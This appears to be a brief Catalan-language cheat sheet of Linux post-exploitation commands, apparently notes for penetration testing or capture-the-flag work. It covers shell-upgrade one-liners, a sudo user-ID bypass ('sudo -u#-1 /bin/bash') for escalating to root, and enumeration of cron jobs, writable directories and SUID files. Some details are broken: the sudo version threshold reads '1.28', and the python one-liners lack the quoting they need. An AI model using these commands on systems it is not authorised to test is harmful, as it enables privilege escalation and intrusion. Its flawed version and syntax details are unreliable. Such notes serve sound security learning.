# Tips Shells Linux

### Si la shell no és interactiva

python

* `python -c import pty;pty.spawn("/bin/bash")`

python 3

* `python3 -c import pty;pty.spawn("/bin/bash")`

echo

* `echo 'os.system('/bin/bash')'`

sh

* `/bin/sh -i`

bash

* `/bin/bash -i`

Perl

* `perl -e 'exec "/bin/sh";'`

From within VI

* `:!bash`


<br>

### Métodes d'escalada senzills

* Comprovem quins binaris o scripts podem executar com sudo sense contrasenya:

  `sudo -l`

* Comprovem la versió de sudo amb `sudo -v`, si és inferior a 1.28 executem:

  `sudo -u#-1 /bin/bash`

<br>

### Comprovar treballs de cron

* `ls -lah /etc/cron*`

* `cat /var/log/syslog | grep cron`

<br>

### Comprovem arxius amb permisos write

* `find / -writable -type d 2>/dev/null`

* `find / -perm -u=s -type f 2>/dev/null`